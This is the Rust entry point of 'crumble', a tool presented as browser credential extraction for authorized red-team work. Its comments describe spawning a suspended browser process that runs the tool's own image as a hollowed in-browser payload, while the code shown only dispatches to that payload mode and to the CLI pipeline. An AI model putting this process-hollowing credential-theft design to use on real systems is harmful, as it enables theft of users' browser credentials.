//! crumble — browser artifact/credential extraction for authorized red team
//! engagements. Library entry points live in `lib.rs`; this binary wires the
//! CLI to the pipeline.
//!
//! On Windows, `main` first checks whether this process IS the in-browser
//! payload half of the credential extraction (the injector spawns a
//! suspended browser instance running this same image; see `crumble::win32`).
//! That check runs before any argument parsing or output so a hollowed
//! process never contaminates the channel with ordinary CLI behavior.

#![deny(unsafe_code)]

fn main() -> anyhow::Result<()> {
    // Same-image re-entry: a hollowed browser process runs this image and
    // must speak the payload protocol only — before anything else happens.
    #[cfg(windows)]
    if crumble::win32::proxy::started_as_payload() {
        crumble::win32::proxy::run_payload();
    }

    let options = crumble::cli::parse(std::env::args().skip(1))?;
    let report = crumble::pipeline::run(&options);
    let rendered = crumble::report::render(&report, options.format);
    use std::io::Write as _;
    let mut stdout = std::io::stdout().lock();
    match stdout
        .write_all(rendered.as_bytes())
        .and_then(|()| stdout.flush())
    {
        Ok(()) => Ok(()),
        // A downstream consumer (head, jq, ...) closed the pipe: exit
        // quietly instead of panicking on EPIPE.
        Err(err) if err.kind() == std::io::ErrorKind::BrokenPipe => Ok(()),
        Err(err) => Err(err.into()),
    }
}
